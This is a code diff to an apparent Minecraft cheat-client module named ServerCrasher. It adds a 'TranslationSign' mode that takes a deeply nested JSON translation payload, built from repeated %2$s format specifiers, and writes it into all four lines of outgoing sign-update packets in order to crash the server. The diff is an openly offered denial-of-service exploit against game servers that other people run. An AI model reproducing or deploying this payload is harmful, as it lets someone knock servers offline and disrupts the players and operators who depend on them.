@@ -2,6 +2,7 @@ package com.mentalfrostbyte.jello.module.impl.world;
 
 
 import com.mentalfrostbyte.Client;
+import com.mentalfrostbyte.jello.event.impl.game.network.EventSendPacket;
 import com.mentalfrostbyte.jello.event.impl.player.EventUpdate;
 import com.mentalfrostbyte.jello.managers.util.notifs.Notification;
 import com.mentalfrostbyte.jello.module.Module;
@@ -15,15 +16,28 @@ import net.minecraft.nbt.StringNBT;
 import net.minecraft.network.play.client.CAnimateHandPacket;
 import net.minecraft.network.play.client.CCreativeInventoryActionPacket;
 import net.minecraft.network.play.client.CPlayerPacket;
+import net.minecraft.network.play.client.CUpdateSignPacket;
 import net.minecraft.util.Hand;
 import team.sdhq.eventBus.annotations.EventTarget;
 
+import java.util.Arrays;
+
 public class ServerCrasher extends Module {
 	public int i;
+	private static final String TEXT = "{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\"," +
+			"\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\"," +
+			"\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\"," +
+			"\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\"," +
+			"\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\"," +
+			"\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s\"," +
+			"\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s\"," +
+			"\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s\"," +
+			"\"with\":[\"a\",\"a\"]}]}]}]}]}]}]}]}";
+
 
 	public ServerCrasher() {
 		super(ModuleCategory.WORLD, "ServerCrasher", "Crashes a server");
-		this.registerSetting(new ModeSetting("Mode", "Crasher mode", 0, "Flying Enabled", "Vanilla", "Book", "Infinity", "BrainFreeze"));
+		this.registerSetting(new ModeSetting("Mode", "Crasher mode", 0, "Flying Enabled", "Vanilla", "Book", "TranslationSign", "Infinity", "BrainFreeze"));
 	}
 
 	@Override
@@ -130,6 +144,22 @@ public class ServerCrasher extends Module {
 					Client.getInstance().notificationManager
 							.send(new Notification("ServerCrasher", "Trying to crash the server.."));
 				}
+		}
+	}
+
+	@EventTarget
+	public void onSendPacket(EventSendPacket event){
+		final var packet = event.packet;
+		String mode = this.getStringSettingValueByName("Mode");
+		switch (mode) {
+			case "TranslationSign" -> {
+				if (packet instanceof CUpdateSignPacket) {
+					((CUpdateSignPacket) packet).lines[0] = TEXT;
+					((CUpdateSignPacket) packet).lines[1] = TEXT;
+					((CUpdateSignPacket) packet).lines[2] = TEXT;
+					((CUpdateSignPacket) packet).lines[3] = TEXT;
+				}
+			}
 		}
 	}
 }
